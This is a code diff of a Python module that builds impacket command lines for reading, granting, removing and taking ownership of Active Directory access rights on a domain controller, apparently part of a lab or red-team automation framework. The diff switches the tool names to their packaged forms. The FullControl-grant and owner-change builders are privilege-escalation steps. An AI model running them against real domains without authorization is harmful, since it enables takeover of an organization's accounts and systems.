@@ -8,7 +8,7 @@ every ACE/owner read or write goes through one of the ``*_argv`` builders here,
 so parsing rules can't drift across the 7 files that need them.
 
 UNVERIFIED (pin in-lab): the exact human-readable rights wording impacket's
-``dacledit.py``/``owneredit.py`` print. If the real wording differs, a T3
+``impacket-dacledit``/``impacket-owneredit`` print. If the real wording differs, a T3
 executor's ``confirm_ace`` call degrades to ``None`` (unknown -- attempt anyway
 with an advisory), never a false ``viable=False``/abort -- the same fail-safe
 contract every probe in this codebase already honours.
@@ -96,32 +96,32 @@ def _op_auth_argv(cfg) -> list[str]:
 
 # ---------------------------------------------------------------- dacledit argv
 def dacledit_read_argv(cfg, target: str, dc: str) -> list[str]:
-    return ["dacledit.py", "-action", "read", "-target", target, "-dc-ip", dc,
+    return ["impacket-dacledit", "-action", "read", "-target", target, "-dc-ip", dc,
             *_op_auth_argv(cfg)]
 
 
 def dacledit_write_argv(cfg, target: str, dc: str, trustee: str,
                         rights: str = "FullControl") -> list[str]:
-    return ["dacledit.py", "-action", "write", "-ace-type", "grant",
+    return ["impacket-dacledit", "-action", "write", "-ace-type", "grant",
             "-rights", rights, "-principal", trustee, "-target", target,
             "-dc-ip", dc, *_op_auth_argv(cfg)]
 
 
 def dacledit_remove_argv(cfg, target: str, dc: str, trustee: str,
                          rights: str = "FullControl") -> list[str]:
-    return ["dacledit.py", "-action", "remove", "-ace-type", "grant",
+    return ["impacket-dacledit", "-action", "remove", "-ace-type", "grant",
             "-rights", rights, "-principal", trustee, "-target", target,
             "-dc-ip", dc, *_op_auth_argv(cfg)]
 
 
 # ---------------------------------------------------------------- owneredit argv
 def owneredit_read_argv(cfg, target: str, dc: str) -> list[str]:
-    return ["owneredit.py", "-action", "read", "-target", target, "-dc-ip", dc,
+    return ["impacket-owneredit", "-action", "read", "-target", target, "-dc-ip", dc,
             *_op_auth_argv(cfg)]
 
 
 def owneredit_write_argv(cfg, target: str, dc: str, new_owner: str) -> list[str]:
-    return ["owneredit.py", "-action", "write", "-new-owner", new_owner,
+    return ["impacket-owneredit", "-action", "write", "-new-owner", new_owner,
             "-target", target, "-dc-ip", dc, *_op_auth_argv(cfg)]
 
 
